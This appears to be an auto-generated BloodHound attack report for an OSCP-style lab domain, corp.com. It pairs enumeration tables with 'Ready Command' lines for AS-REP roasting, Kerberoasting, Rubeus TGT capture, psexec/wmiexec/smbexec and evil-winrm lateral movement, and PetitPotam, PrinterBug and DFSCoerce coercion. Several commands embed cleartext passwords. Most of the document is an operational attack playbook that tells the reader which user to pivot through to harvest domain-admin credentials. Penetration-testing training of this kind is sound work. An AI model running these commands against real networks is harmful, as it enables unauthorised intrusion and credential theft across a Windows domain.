# BloodHound Enhanced Report

**Generated:** 2025-12-03 23:30:07

---

## Data Inventory

**Domains:** CORP.COM

| Type | Count | Details |
|------|-------|---------|
| Users | 13 | 9 enabled |
| Computers | 6 | CLIENT74.CORP.COM, CLIENT75.CORP.COM, CLIENT76.CORP.COM |
| Groups | 56 | ACCOUNT OPERATORS@CORP.COM, ADMINISTRATORS@CORP.COM, BACKUP OPERATORS@CORP.COM |

**Relationships:** GenericAll: 190 | WriteDacl: 140 | MemberOf: 54 | AdminTo: 14 | DCSync: 5 | CanRDP: 4 | CanPSRemote: 1

## Attack Commands

## Attack Commands

### Quick Wins

### impacket-GetNPUsers - AS-REP Roasting Attack 

**Objective:** Extract AS-REP hashes from users with 'Do not require Kerberos preauthentication' enabled (AS-REP Roasting).
Targets misconfigured accounts to obtain crackable password hashes without authentication.
**Rewards:** AS-REP roast - no auth required
**Template:** `impacket-GetNPUsers -dc-ip <DC_IP> -request -outputfile <OUTPUT_FILE> <DOMAIN>/<USERNAME>`
**Example:** `impacket-GetNPUsers -dc-ip 192.168.50.70 -request -outputfile hashes.asreproast corp.com/pete`
**Requires:** None (pre-auth disabled on target)

| Discovered | Domain | Warnings | Info | Ready Command |
|------|--------|----------|--------|---------------|
| DAVE@CORP.COM | CORP.COM |  | AS-REP roast - no auth required | `impacket-GetNPUsers -dc-ip 192.168.249.70 -request -outputfile <OUTPUT_FILE> corp.com/DAVE` |

### impacket-GetUserSPNs - Kerberoasting Attack 

**Objective:** Request and extract TGS-REP hashes for service accounts (Kerberoasting)
**Rewards:** Kerberoast - request TGS for offline cracking
**Template:** `impacket-GetUserSPNs -request -dc-ip <DC_IP> <DOMAIN>/<USERNAME>:"<PASSWORD>"`
**Example:** `impacket-GetUserSPNs -request -dc-ip 192.168.50.70 corp.com/meg:"VimForPowerShell123!"`
**Need:** <PASSWORD>
**Requires:** Any authenticated domain user

| Discovered | Domain | Warnings | Info | Ready Command |
|------|--------|----------|--------|---------------|
| IIS_SERVICE@CORP.COM | CORP.COM |  | Kerberoast - request TGS for offline cracking | `impacket-GetUserSPNs -request -dc-ip 192.168.249.70 corp.com/<USER>:"<PASSWORD>"` |

### Rubeus - Monitor for TGTs (Unconstrained Delegation) 

**Objective:** Monitor for incoming TGTs on unconstrained delegation host
**Rewards:** Unconstrained delegation - monitor for TGT capture
**Template:** `Rubeus.exe monitor /interval:5 /nowrap /targetuser:<TARGET_USER>`
**Example:** `Rubeus.exe monitor /interval:5 /nowrap /targetuser:DC01$`
**Need:** <TARGET_USER>
**Requires:** Local admin on unconstrained delegation host

| User | Target | Warnings | Reason | Ready Command |
|------|--------|----------|--------|---------------|
|  | DC1.CORP.COM |  | Unconstrained delegation - monitor for TGT capture | `Rubeus.exe monitor /interval:5 /nowrap /targetuser:<TARGET_USER>` |

### Impacket PSExec - Remote Command Execution 

**Objective:** Execute commands on remote Windows system via SMB + MSRPC. Creates Windows service, provides interactive shell. Most versatile Impacket execution tool.
**Rewards:** Pivot through machine to harvest DA credentials
**Template:** `impacket-psexec '<DOMAIN>/<USERNAME>:<PASSWORD>@<TARGET>'`
**Example:** `impacket-psexec 'corp.com/administrator:P@ssw0rd!@192.168.50.75'`
**Need:** <PASSWORD>
**Requires:** Owned user with AdminTo on pivot

| User | Target | Warnings | Reason | Ready Command |
|------|--------|----------|--------|---------------|
| STEPHANIE@CORP.COM | CLIENT74.CORP.COM |  | Pivot through machine to harvest DA credentials | `impacket-psexec 'corp.com/STEPHANIE:<PASSWORD>@192.168.249.74'` |
| LEON@CORP.COM | FILES04.CORP.COM |  | Pivot through machine to harvest DA credentials | `impacket-psexec 'corp.com/LEON:HomeTaping199!@192.168.249.73'` |
| LEON@CORP.COM | CLIENT74.CORP.COM |  | Pivot through machine to harvest DA credentials | `impacket-psexec 'corp.com/LEON:HomeTaping199!@192.168.249.74'` |
| JEN@CORP.COM | CLIENT74.CORP.COM |  | Pivot through machine to harvest DA credentials | `impacket-psexec 'corp.com/JEN:<PASSWORD>@192.168.249.74'` |
| JEN@CORP.COM | FILES04.CORP.COM |  | Pivot through machine to harvest DA credentials | `impacket-psexec 'corp.com/JEN:<PASSWORD>@192.168.249.73'` |
| JEFF@CORP.COM | CLIENT74.CORP.COM |  | Pivot through machine to harvest DA credentials | `impacket-psexec 'corp.com/JEFF:<PASSWORD>@192.168.249.74'` |
| DAVE@CORP.COM | CLIENT74.CORP.COM |  | Pivot through machine to harvest DA credentials | `impacket-psexec 'corp.com/DAVE:Flowers1@192.168.249.74'` |

### Evil-WinRM - PowerShell Remoting 

**Objective:** Connect to Windows via WinRM for PowerShell access
**Rewards:** Pivot through machine to harvest DA credentials
**Template:** `evil-winrm -i <TARGET> -u <USER> -p <PASSWORD>`
**Example:** `evil-winrm -i 192.168.1.10 -u administrator -p Password123`
**Need:** <PASSWORD>
**Requires:** Owned user with AdminTo on pivot

| User | Target | Warnings | Reason | Ready Command |
|------|--------|----------|--------|---------------|
| STEPHANIE@CORP.COM | CLIENT74.CORP.COM |  | Pivot through machine to harvest DA credentials | `evil-winrm -i 192.168.249.74 -u STEPHANIE -p <PASSWORD>` |
| LEON@CORP.COM | FILES04.CORP.COM |  | Pivot through machine to harvest DA credentials | `evil-winrm -i 192.168.249.73 -u LEON -p HomeTaping199!` |
| LEON@CORP.COM | CLIENT74.CORP.COM |  | Pivot through machine to harvest DA credentials | `evil-winrm -i 192.168.249.74 -u LEON -p HomeTaping199!` |
| JEN@CORP.COM | CLIENT74.CORP.COM |  | Pivot through machine to harvest DA credentials | `evil-winrm -i 192.168.249.74 -u JEN -p <PASSWORD>` |
| JEN@CORP.COM | FILES04.CORP.COM |  | Pivot through machine to harvest DA credentials | `evil-winrm -i 192.168.249.73 -u JEN -p <PASSWORD>` |
| JEFF@CORP.COM | CLIENT74.CORP.COM |  | Pivot through machine to harvest DA credentials | `evil-winrm -i 192.168.249.74 -u JEFF -p <PASSWORD>` |
| DAVE@CORP.COM | CLIENT74.CORP.COM |  | Pivot through machine to harvest DA credentials | `evil-winrm -i 192.168.249.74 -u DAVE -p Flowers1` |

### Lateral Movement

### Impacket PSExec - Remote Command Execution [AdminTo]

**Objective:** Execute commands on remote Windows system via SMB + MSRPC. Creates Windows service, provides interactive shell. Most versatile Impacket execution tool.
**Rewards:** SYSTEM shell for credential dumping, persistence, and pivoting
**Template:** `impacket-psexec '<DOMAIN>/<USERNAME>:<PASSWORD>@<TARGET>'`
**Example:** `impacket-psexec 'corp.com/administrator:P@ssw0rd!@192.168.50.75'`
**Need:** <PASSWORD>
**Requires:** Local admin on target (AdminTo edge)

| User | Target | Warnings | Reason | Ready Command |
|------|--------|----------|--------|---------------|
| LEON@CORP.COM | FILES04.CORP.COM |  | LEON has local admin rights on FILES04 | `impacket-psexec 'corp.com/LEON:HomeTaping199!@192.168.249.73'` |
| LEON@CORP.COM | CLIENT74.CORP.COM |  | LEON has local admin rights on CLIENT74 | `impacket-psexec 'corp.com/LEON:HomeTaping199!@192.168.249.74'` |
| JEN@CORP.COM | CLIENT74.CORP.COM |  | JEN has local admin rights on CLIENT74 | `impacket-psexec 'corp.com/JEN:<PASSWORD>@192.168.249.74'` |
| JEN@CORP.COM | FILES04.CORP.COM |  | JEN has local admin rights on FILES04 | `impacket-psexec 'corp.com/JEN:<PASSWORD>@192.168.249.73'` |
| STEPHANIE@CORP.COM | CLIENT74.CORP.COM |  | STEPHANIE has local admin rights on CLIENT74 | `impacket-psexec 'corp.com/STEPHANIE:<PASSWORD>@192.168.249.74'` |
| JEFF@CORP.COM | CLIENT74.CORP.COM |  | JEFF has local admin rights on CLIENT74 | `impacket-psexec 'corp.com/JEFF:<PASSWORD>@192.168.249.74'` |
| DAVE@CORP.COM | CLIENT74.CORP.COM |  | DAVE has local admin rights on CLIENT74 | `impacket-psexec 'corp.com/DAVE:Flowers1@192.168.249.74'` |

### Impacket WMIExec - WMI Remote Execution [AdminTo]

**Objective:** Execute commands remotely via Windows Management Instrumentation (WMI). Fileless, serviceless, stealthiest Impacket execution method. Uses DCOM on port 135 + ephemeral RPC.
**Rewards:** SYSTEM shell for credential dumping, persistence, and pivoting
**Template:** `impacket-wmiexec '<DOMAIN>/<USERNAME>:<PASSWORD>@<TARGET>'`
**Example:** `impacket-wmiexec 'corp.com/administrator:P@ssw0rd!@192.168.50.75'`
**Need:** <PASSWORD>
**Requires:** Local admin on target (AdminTo edge)

| User | Target | Warnings | Reason | Ready Command |
|------|--------|----------|--------|---------------|
| LEON@CORP.COM | FILES04.CORP.COM |  | LEON has local admin rights on FILES04 | `impacket-wmiexec 'corp.com/LEON:HomeTaping199!@192.168.249.73'` |
| LEON@CORP.COM | CLIENT74.CORP.COM |  | LEON has local admin rights on CLIENT74 | `impacket-wmiexec 'corp.com/LEON:HomeTaping199!@192.168.249.74'` |
| JEN@CORP.COM | CLIENT74.CORP.COM |  | JEN has local admin rights on CLIENT74 | `impacket-wmiexec 'corp.com/JEN:<PASSWORD>@192.168.249.74'` |
| JEN@CORP.COM | FILES04.CORP.COM |  | JEN has local admin rights on FILES04 | `impacket-wmiexec 'corp.com/JEN:<PASSWORD>@192.168.249.73'` |
| STEPHANIE@CORP.COM | CLIENT74.CORP.COM |  | STEPHANIE has local admin rights on CLIENT74 | `impacket-wmiexec 'corp.com/STEPHANIE:<PASSWORD>@192.168.249.74'` |
| JEFF@CORP.COM | CLIENT74.CORP.COM |  | JEFF has local admin rights on CLIENT74 | `impacket-wmiexec 'corp.com/JEFF:<PASSWORD>@192.168.249.74'` |
| DAVE@CORP.COM | CLIENT74.CORP.COM |  | DAVE has local admin rights on CLIENT74 | `impacket-wmiexec 'corp.com/DAVE:Flowers1@192.168.249.74'` |

### Impacket SMBExec - Fileless Remote Execution [AdminTo]

**Objective:** Execute commands remotely via SMB service creation. Fileless alternative to psexec - creates service but no executable written to disk. Better AV evasion.
**Rewards:** SYSTEM shell for credential dumping, persistence, and pivoting
**Template:** `impacket-smbexec '<DOMAIN>/<USERNAME>:<PASSWORD>@<TARGET>'`
**Example:** `impacket-smbexec 'corp.com/administrator:P@ssw0rd!@192.168.50.75'`
**Need:** <PASSWORD>
**Requires:** Local admin on target (AdminTo edge)

| User | Target | Warnings | Reason | Ready Command |
|------|--------|----------|--------|---------------|
| LEON@CORP.COM | FILES04.CORP.COM |  | LEON has local admin rights on FILES04 | `impacket-smbexec 'corp.com/LEON:HomeTaping199!@192.168.249.73'` |
| LEON@CORP.COM | CLIENT74.CORP.COM |  | LEON has local admin rights on CLIENT74 | `impacket-smbexec 'corp.com/LEON:HomeTaping199!@192.168.249.74'` |
| JEN@CORP.COM | CLIENT74.CORP.COM |  | JEN has local admin rights on CLIENT74 | `impacket-smbexec 'corp.com/JEN:<PASSWORD>@192.168.249.74'` |
| JEN@CORP.COM | FILES04.CORP.COM |  | JEN has local admin rights on FILES04 | `impacket-smbexec 'corp.com/JEN:<PASSWORD>@192.168.249.73'` |
| STEPHANIE@CORP.COM | CLIENT74.CORP.COM |  | STEPHANIE has local admin rights on CLIENT74 | `impacket-smbexec 'corp.com/STEPHANIE:<PASSWORD>@192.168.249.74'` |
| JEFF@CORP.COM | CLIENT74.CORP.COM |  | JEFF has local admin rights on CLIENT74 | `impacket-smbexec 'corp.com/JEFF:<PASSWORD>@192.168.249.74'` |
| DAVE@CORP.COM | CLIENT74.CORP.COM |  | DAVE has local admin rights on CLIENT74 | `impacket-smbexec 'corp.com/DAVE:Flowers1@192.168.249.74'` |

### Impacket PSExec - Remote Command Execution [AdminTo]

**Objective:** Execute commands on remote Windows system via SMB + MSRPC. Creates Windows service, provides interactive shell. Most versatile Impacket execution tool.
**Rewards:** SYSTEM shell for credential dumping, persistence, and pivoting
**Template:** `impacket-psexec '<DOMAIN>/<USERNAME>:<PASSWORD>@<TARGET>'`
**Example:** `impacket-psexec 'corp.com/administrator:P@ssw0rd!@192.168.50.75'`
**Need:** <PASSWORD>
**Requires:** Local admin on target (AdminTo edge)

| User | Target | Warnings | Reason | Ready Command |
|------|--------|----------|--------|---------------|
| JEN@CORP.COM | CLIENT74.CORP.COM |  | JEN has local admin rights on CLIENT74 | `impacket-psexec 'corp.com/JEN:<PASSWORD>@192.168.249.74'` |
| JEFF@CORP.COM | CLIENT74.CORP.COM |  | JEFF has local admin rights on CLIENT74 | `impacket-psexec 'corp.com/JEFF:<PASSWORD>@192.168.249.74'` |
| DAVE@CORP.COM | CLIENT74.CORP.COM |  | DAVE has local admin rights on CLIENT74 | `impacket-psexec 'corp.com/DAVE:Flowers1@192.168.249.74'` |
| STEPHANIE@CORP.COM | CLIENT74.CORP.COM |  | STEPHANIE has local admin rights on CLIENT74 | `impacket-psexec 'corp.com/STEPHANIE:<PASSWORD>@192.168.249.74'` |
| LEON@CORP.COM | CLIENT74.CORP.COM |  | LEON has local admin rights on CLIENT74 | `impacket-psexec 'corp.com/LEON:HomeTaping199!@192.168.249.74'` |
| JEFFADMIN@CORP.COM | FILES04.CORP.COM |  | JEFFADMIN has local admin rights on FILES04 | `impacket-psexec 'corp.com/JEFFADMIN:<PASSWORD>@192.168.249.73'` |
| LEON@CORP.COM | FILES04.CORP.COM |  | LEON has local admin rights on FILES04 | `impacket-psexec 'corp.com/LEON:HomeTaping199!@192.168.249.73'` |
| JEN@CORP.COM | FILES04.CORP.COM |  | JEN has local admin rights on FILES04 | `impacket-psexec 'corp.com/JEN:<PASSWORD>@192.168.249.73'` |

### Evil-WinRM - PowerShell Remoting [CanPSRemote]

**Objective:** Connect to Windows via WinRM for PowerShell access
**Rewards:** PowerShell remoting for stealthy command execution
**Template:** `evil-winrm -i <TARGET> -u <USER> -p <PASSWORD>`
**Example:** `evil-winrm -i 192.168.1.10 -u administrator -p Password123`
**Need:** <PASSWORD>
**Requires:** Remote Management Users or Administrators group

| User | Target | Warnings | Reason | Ready Command |
|------|--------|----------|--------|---------------|
| JEFFADMIN@CORP.COM | FILES04.CORP.COM |  | JEFFADMIN has PSRemote/WinRM access to FILES04 | `evil-winrm -i 192.168.249.73 -u JEFFADMIN -p <PASSWORD>` |

### xFreeRDP Connection [CanRDP]

**Objective:** Connect to Windows RDP server with xFreeRDP - supports clipboard sharing and certificate bypass
**Rewards:** Interactive desktop access for GUI tools and credential theft
**Template:** `xfreerdp /v:<TARGET>:<PORT> /u:<USERNAME> /p:<PASSWORD> /cert-ignore +clipboard`
**Example:** `xfreerdp /v:192.168.50.63:3389 /u:rdp_admin /p:P@ssw0rd! /cert-ignore +clipboard`
**Need:** <PASSWORD>
**Requires:** Remote Desktop Users or Administrators group

| User | Target | Warnings | Reason | Ready Command |
|------|--------|----------|--------|---------------|
| JEN@CORP.COM | CLIENT74.CORP.COM |  | JEN has RDP access to CLIENT74 | `xfreerdp /v:192.168.249.74:<PORT> /u:JEN /p:<PASSWORD> /cert-ignore +clipboard` |
| JEFFADMIN@CORP.COM | CLIENT74.CORP.COM |  | JEFFADMIN has RDP access to CLIENT74 | `xfreerdp /v:192.168.249.74:<PORT> /u:JEFFADMIN /p:<PASSWORD> /cert-ignore +clipboard` |
| JEFF@CORP.COM | CLIENT74.CORP.COM |  | JEFF has RDP access to CLIENT74 | `xfreerdp /v:192.168.249.74:<PORT> /u:JEFF /p:<PASSWORD> /cert-ignore +clipboard` |
| LEON@CORP.COM | CLIENT74.CORP.COM |  | LEON has RDP access to CLIENT74 | `xfreerdp /v:192.168.249.74:<PORT> /u:LEON /p:HomeTaping199! /cert-ignore +clipboard` |

### Impacket WMIExec - WMI Remote Execution [ExecuteDCOM]

**Objective:** Execute commands remotely via Windows Management Instrumentation (WMI). Fileless, serviceless, stealthiest Impacket execution method. Uses DCOM on port 135 + ephemeral RPC.
**Rewards:** Remote code execution via DCOM for lateral movement
**Template:** `impacket-wmiexec '<DOMAIN>/<USERNAME>:<PASSWORD>@<TARGET>'`
**Example:** `impacket-wmiexec 'corp.com/administrator:P@ssw0rd!@192.168.50.75'`
**Need:** <PASSWORD>
**Requires:** DCOM execution rights on target

| User | Target | Warnings | Reason | Ready Command |
|------|--------|----------|--------|---------------|
| JEN@CORP.COM | CLIENT74.CORP.COM |  | JEN can execute DCOM on CLIENT74 | `impacket-wmiexec 'corp.com/JEN:<PASSWORD>@192.168.249.74'` |

### PetitPotam - Coerce NTLM Authentication [CoerceToTGT]

**Objective:** Force target machine to authenticate to attacker using EfsRpcOpenFileRaw
**Rewards:** Coerce authentication to capture TGT
**Template:** `python3 PetitPotam.py -u '<USERNAME>' -p '<PASSWORD>' -d '<DOMAIN>' <LISTENER_IP> <TARGET_IP>`
**Example:** `python3 PetitPotam.py -u 'user' -p '<PASSWORD>' -d 'corp.local' 192.168.50.100 192.168.50.70`
**Need:** <PASSWORD>
**Requires:** Network access to target + listener on unconstrained host

| User | Target | Warnings | Reason | Ready Command |
|------|--------|----------|--------|---------------|
| DC1.CORP.COM | CORP.COM |  | DC1.CORP.COM can coerce CORP auth to capture TGT | `python3 PetitPotam.py -u '<USERNAME>' -p '<PASSWORD>' -d 'corp.com' 192.168.249.70 CORP.COM` |

### Coercer - Multi-Protocol Authentication Coercion [CoerceToTGT]

**Objective:** Test multiple coercion methods (MS-RPRN, MS-EFSR, MS-FSRVP, etc.)
**Rewards:** Coerce authentication to capture TGT
**Template:** `coercer coerce -u '<USERNAME>' -p '<PASSWORD>' -d '<DOMAIN>' -l <LISTENER_IP> -t <TARGET_IP>`
**Example:** `coercer coerce -u 'user' -p '<PASSWORD>' -d 'corp.local' -l 192.168.50.100 -t 192.168.50.70`
**Need:** <PASSWORD>
**Requires:** Network access to target + listener on unconstrained host

| User | Target | Warnings | Reason | Ready Command |
|------|--------|----------|--------|---------------|
| DC1.CORP.COM | CORP.COM |  | DC1.CORP.COM can coerce CORP auth to capture TGT | `coercer coerce -u '<USERNAME>' -p '<PASSWORD>' -d 'corp.com' -l 192.168.249.70 -t CORP.COM` |

### PrinterBug/SpoolSample - Trigger Print Spooler Coercion [CoerceToTGT]

**Objective:** Force target to authenticate using MS-RPRN (Print Spooler)
**Rewards:** Coerce authentication to capture TGT
**Template:** `python3 printerbug.py '<DOMAIN>/<USERNAME>:<PASSWORD>@<TARGET_IP>' <LISTENER_IP>`
**Example:** `python3 printerbug.py 'corp.local/user:<PASSWORD>@192.168.50.70' 192.168.50.100`
**Need:** <PASSWORD>
**Requires:** Network access to target + listener on unconstrained host

| User | Target | Warnings | Reason | Ready Command |
|------|--------|----------|--------|---------------|
| DC1.CORP.COM | CORP.COM |  | DC1.CORP.COM can coerce CORP auth to capture TGT | `python3 printerbug.py 'corp.com/<USERNAME>:<PASSWORD>@CORP.COM' 192.168.249.70` |

### DFSCoerce - Trigger DFS Coercion [CoerceToTGT]

**Objective:** Force target to authenticate using MS-DFSNM (DFS)
**Rewards:** Coerce authentication to capture TGT
**Template:** `python3 dfscoerce.py -u '<USERNAME>' -p '<PASSWORD>' -d '<DOMAIN>' <LISTENER_IP> <TARGET_IP>`
**Example:** `python3 dfscoerce.py -u 'user' -p '<PASSWORD>' -d 'corp.local' 192.168.50.100 192.168.50.70`
**Need:** <PASSWORD>
**Requires:** Network access to target + listener on unconstrained host

| User | Target | Warnings | Reason | Ready Command |
|------|--------|----------|--------|---------------|
| DC1.CORP.COM | CORP.COM |  | DC1.CORP.COM can coerce CORP auth to capture TGT | `python3 dfscoerce.py -u '<USERNAME>' -p '<PASSWORD>' -d 'corp.com' 192.168.249.70 CORP.COM` |

---

## Quick Wins

### ✅ AS-REP Roastable Users
**OSCP Relevance:** HIGH | **Results:** 1

> Find users with Kerberos pre-authentication disabled (dontreqpreauth=true). These can be AS-REP roasted without authentication using GetNPUsers.py.

| User | IsPrivileged | Description |
| --- | --- | --- |
| DAVE@CORP.COM | False |  |

### ✅ Kerberoastable Service Accounts
**OSCP Relevance:** HIGH | **Results:** 1

> Find users with Service Principal Names (SPNs). These can be Kerberoasted to obtain TGS hashes for offline cracking.

| ServiceAccount | SPNs | IsPrivileged | Description |
| --- | --- | --- | --- |
| IIS_SERVICE@CORP.COM | ['HTTP/web04.corp.com', 'HTTP/web04', 'HTTP/web04.corp.com:80'] | False |  |

### ⚪ High-Value Kerberoastable (Privileged + SPN)
**OSCP Relevance:** HIGH | **Results:** None

### ✅ Unconstrained Delegation Systems
**OSCP Relevance:** HIGH | **Results:** 1

> Find computers with unconstrained delegation enabled. These can be abused to capture TGTs from authenticating users (printer bug, coercion attacks).

| Computer | ComputerIP | OS | Description |
| --- | --- | --- | --- |
| DC1.CORP.COM | 192.168.249.70 | WINDOWS SERVER 2022 STANDARD |  |

### ⚪ Constrained Delegation Principals
**OSCP Relevance:** HIGH | **Results:** None

### ⚪ Users with Passwords in Description
**OSCP Relevance:** HIGH | **Results:** None

### ✅ Accounts with Password Never Expires
**OSCP Relevance:** MEDIUM | **Results:** 8

> Find accounts with non-expiring passwords. Often service accounts with weak passwords or credentials in documentation.

| User | IsPrivileged | Description |
| --- | --- | --- |
| JEFFADMIN@CORP.COM | True |  |
| ADMINISTRATOR@CORP.COM | True | Built-in account for administering the computer/domain |
| STEPHANIE@CORP.COM | False |  |
| PETE@CORP.COM | False |  |
| JEN@CORP.COM | False |  |
| JEFF@CORP.COM | False |  |
| IIS_SERVICE@CORP.COM | False |  |
| DAVE@CORP.COM | False |  |

### ⚪ Accounts That Never Logged In
**OSCP Relevance:** MEDIUM | **Results:** None

### ✅ Computers Without LAPS
**OSCP Relevance:** MEDIUM | **Results:** 5

> Find computers that don't have LAPS deployed. Local admin passwords may be reused or weak.

| Computer | ComputerIP | OS |
| --- | --- | --- |
| CLIENT74.CORP.COM | 192.168.249.74 | WINDOWS 11 ENTERPRISE |
| CLIENT75.CORP.COM | 192.168.249.75 | WINDOWS 11 PRO |
| CLIENT76.CORP.COM | 192.168.249.76 | WINDOWS 10 PRO |
| FILES04.CORP.COM | 192.168.249.73 | WINDOWS SERVER 2022 STANDARD |
| WEB04.CORP.COM | 192.168.249.72 | WINDOWS SERVER 2022 STANDARD |

### ✅ Pre-Windows 2000 Compatible Access Accounts
**OSCP Relevance:** LOW | **Results:** 1

> Find computers in Pre-Windows 2000 Compatible Access group. Legacy compatibility may expose vulnerabilities.

| Member | Type | ViaGroup |
| --- | --- | --- |
| AUTHENTICATED USERS@CORP.COM | ['Group', 'Base'] | PRE-WINDOWS 2000 COMPATIBLE ACCESS@CORP.COM |

### ⚪ ReadGMSAPassword Rights
**OSCP Relevance:** HIGH | **Results:** None

### ⚪ ReadLAPSPassword Rights
**OSCP Relevance:** HIGH | **Results:** None

### ⚪ All gMSA Accounts
**OSCP Relevance:** HIGH | **Results:** None

---

## Lateral Movement

### ✅ Non-DA Users with Local Admin on Workstations
**OSCP Relevance:** HIGH | **Results:** 5

> Find non-privileged users with local admin rights on workstations (not DCs). KEY QUERY from DCSync capstone - discovered MIKE->CLIENT75 attack path. These are prime lateral movement targets.

| User | AdminOnComputers | AdminOnIPs | ComputerCount |
| --- | --- | --- | --- |
| LEON@CORP.COM | ['FILES04.CORP.COM', 'CLIENT74.CORP.COM'] | ['192.168.249.73', '192.168.249.74'] | 2 |
| JEN@CORP.COM | ['CLIENT74.CORP.COM', 'FILES04.CORP.COM'] | ['192.168.249.74', '192.168.249.73'] | 2 |
| STEPHANIE@CORP.COM | ['CLIENT74.CORP.COM'] | ['192.168.249.74'] | 1 |
| JEFF@CORP.COM | ['CLIENT74.CORP.COM'] | ['192.168.249.74'] | 1 |
| DAVE@CORP.COM | ['CLIENT74.CORP.COM'] | ['192.168.249.74'] | 1 |

### ✅ All Local Admins per Computer
**OSCP Relevance:** HIGH | **Results:** 2

> Enumerate all principals (users, groups) with local admin rights on each computer. Useful for identifying high-value targets with many admin paths.

| Computer | ComputerIP | LocalAdmins | AdminCount |
| --- | --- | --- | --- |
| CLIENT74.CORP.COM | 192.168.249.74 | ['JEN@CORP.COM', 'JEFF@CORP.COM', 'DAVE@CORP.COM', 'DOMAIN ADMINS@CORP.COM', 'STEPHANIE@CORP.COM', 'LEON@CORP.COM'] | 6 |
| FILES04.CORP.COM | 192.168.249.73 | ['JEFFADMIN@CORP.COM', 'LEON@CORP.COM', 'JEN@CORP.COM', 'DOMAIN ADMINS@CORP.COM'] | 4 |

### ✅ PSRemote Access (Evil-WinRM Targets)
**OSCP Relevance:** HIGH | **Results:** 1

> Find users with PowerShell Remoting access to computers. These are Evil-WinRM targets for lateral movement.

| User | PSRemoteTargets | PSRemoteIPs | TargetCount |
| --- | --- | --- | --- |
| JEFFADMIN@CORP.COM | ['FILES04.CORP.COM'] | ['192.168.249.73'] | 1 |

### ✅ RDP Access Targets
**OSCP Relevance:** HIGH | **Results:** 4

> Find users with Remote Desktop access to computers. RDP provides interactive access for credential harvesting.

| User | RDPTargets | RDPIPs | TargetCount |
| --- | --- | --- | --- |
| JEN@CORP.COM | ['CLIENT74.CORP.COM'] | ['192.168.249.74'] | 1 |
| JEFFADMIN@CORP.COM | ['CLIENT74.CORP.COM'] | ['192.168.249.74'] | 1 |
| JEFF@CORP.COM | ['CLIENT74.CORP.COM'] | ['192.168.249.74'] | 1 |
| LEON@CORP.COM | ['CLIENT74.CORP.COM'] | ['192.168.249.74'] | 1 |

### ✅ DCOM Execution Rights
**OSCP Relevance:** MEDIUM | **Results:** 1

> Find users with DCOM execution rights on computers. DCOM can be used for lateral movement via impacket-dcomexec.

| User | DCOMTargets | DCOMIPs | TargetCount |
| --- | --- | --- | --- |
| JEN@CORP.COM | ['CLIENT74.CORP.COM'] | ['192.168.249.74'] | 1 |

### Sessions on Specific Computer
*Skipped - requires variables: COMPUTER*

### All Computer Access for Specific User
*Skipped - requires variables: USER*

### All Users Who Can Access Specific Computer
*Skipped - requires variables: COMPUTER*

### ⚪ Computers Where Domain Users Are Local Admin
**OSCP Relevance:** HIGH | **Results:** None

### ✅ Computers with Multiple Admin Paths
**OSCP Relevance:** MEDIUM | **Results:** 2

> Find computers accessible via multiple different users. These are high-value targets with more exploitation options.

| Computer | ComputerIP | NumberOfAdminPaths | Admins |
| --- | --- | --- | --- |
| CLIENT74.CORP.COM | 192.168.249.74 | 6 | ['JEN@CORP.COM', 'JEFF@CORP.COM', 'DAVE@CORP.COM', 'DOMAIN ADMINS@CORP.COM', 'STEPHANIE@CORP.COM', 'LEON@CORP.COM'] |
| FILES04.CORP.COM | 192.168.249.73 | 4 | ['JEFFADMIN@CORP.COM', 'LEON@CORP.COM', 'JEN@CORP.COM', 'DOMAIN ADMINS@CORP.COM'] |

### ⚪ Workstations with Domain Admin Sessions
**OSCP Relevance:** HIGH | **Results:** None

### ⚪ Cross-Trust Lateral Movement
**OSCP Relevance:** MEDIUM | **Results:** None

### ✅ Coercion Targets (Unconstrained Delegation)
**OSCP Relevance:** HIGH | **Results:** 1

> Find computers with unconstrained delegation that can capture TGTs via coercion attacks (PetitPotam, PrinterBug, DFSCoerce). Coerce a DC to authenticate to these systems to capture its TGT.

| CoercionHost | CoercionHostIP | OS | CanCaptureTGTFrom | TargetType |
| --- | --- | --- | --- | --- |
| DC1.CORP.COM | 192.168.249.70 | WINDOWS SERVER 2022 STANDARD | CORP.COM | ['Base', 'Domain', 'Tag_Tier_Zero'] |

### ⚪ SID History Abuse Paths
**OSCP Relevance:** HIGH | **Results:** None

### ⚪ Domain Trust Relationships
**OSCP Relevance:** HIGH | **Results:** None

---

## Privilege Escalation

### ✅ DCSync Rights
**OSCP Relevance:** HIGH | **Results:** 6

> Find principals with DCSync rights (GetChanges + GetChangesAll on Domain). Can perform secretsdump.py to extract all domain hashes.

| Principal | Type | Right |
| --- | --- | --- |
| DOMAIN CONTROLLERS@CORP.COM | ['Base', 'OU', 'Tag_Tier_Zero'] | GetChangesAll |
| ADMINISTRATORS@CORP.COM | ['Group', 'Base', 'Tag_Tier_Zero'] | GetChanges |
| ENTERPRISE READ-ONLY DOMAIN CONTROLLERS@CORP.COM | ['Group', 'Base'] | GetChanges |
| DOMAIN CONTROLLERS@CORP.COM | ['Group', 'Base', 'Tag_Tier_Zero'] | GetChangesAll |
| ADMINISTRATORS@CORP.COM | ['Group', 'Base', 'Tag_Tier_Zero'] | GetChangesAll |
| ENTERPRISE DOMAIN CONTROLLERS@CORP.COM | ['Group', 'Base', 'Tag_Tier_Zero'] | GetChanges |

### ✅ GenericAll on High-Value Targets
**OSCP Relevance:** HIGH | **Results:** 26

> Find principals with GenericAll (full control) over privileged users, groups, or computers. Can reset passwords, modify group memberships, etc.

| Attacker | Victim | VictimType |
| --- | --- | --- |
| DOMAIN ADMINS@CORP.COM | DOMAIN GUESTS@CORP.COM | ['Group', 'Base'] |
| ACCOUNT OPERATORS@CORP.COM | DOMAIN GUESTS@CORP.COM | ['Group', 'Base'] |
| ENTERPRISE ADMINS@CORP.COM | DOMAIN GUESTS@CORP.COM | ['Group', 'Base'] |
| DOMAIN ADMINS@CORP.COM | DOMAIN USERS@CORP.COM | ['Group', 'Base'] |
| ACCOUNT OPERATORS@CORP.COM | DOMAIN USERS@CORP.COM | ['Group', 'Base'] |
| ENTERPRISE ADMINS@CORP.COM | DOMAIN USERS@CORP.COM | ['Group', 'Base'] |
| DOMAIN ADMINS@CORP.COM | DOMAIN COMPUTERS@CORP.COM | ['Group', 'Base'] |
| ACCOUNT OPERATORS@CORP.COM | DOMAIN COMPUTERS@CORP.COM | ['Group', 'Base'] |
| ENTERPRISE ADMINS@CORP.COM | DOMAIN COMPUTERS@CORP.COM | ['Group', 'Base'] |
| DOMAIN ADMINS@CORP.COM | STORAGE REPLICA ADMINISTRATORS@CORP.COM | ['Group', 'Base'] |
| ACCOUNT OPERATORS@CORP.COM | STORAGE REPLICA ADMINISTRATORS@CORP.COM | ['Group', 'Base'] |
